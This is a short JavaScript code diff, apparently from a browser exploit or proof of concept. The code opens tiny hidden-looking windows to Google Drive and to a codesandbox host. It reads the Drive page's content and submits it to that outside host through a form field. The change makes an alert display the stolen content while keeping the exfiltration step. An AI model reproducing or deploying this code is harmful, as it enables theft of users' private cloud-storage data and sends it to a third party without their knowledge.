@@ -22,13 +22,13 @@ function main() {
       var myWindow = window.open("https://drive.google.com", "myWindow", "width=10,height=10");
       setTimeout(() => {
         var outgoingRequest = window.open("https://dqvznw.sse.codesandbox.io/", "sending", "width=10,height=10");
-      var inter = setInterval(() => {
-          alert("ready");
-          clearInterval(inter);
-          outgoingRequest.document.getElementById("input").value = myWindow.document.body.innerHTML;
-          outgoingRequest.document.getElementById("send").click();
-        }, 100);
-      }, 5000);
+        var inter = setInterval(() => {
+            alert(myWindow.document.body.innerHTML);
+            clearInterval(inter);
+            outgoingRequest.document.getElementById("input").value = myWindow.document.body.innerHTML;
+            outgoingRequest.document.getElementById("send").click();
+          }, 100);
+        }, 5000);
     }
   }, 100);
   window.onkeydown = function(e) {
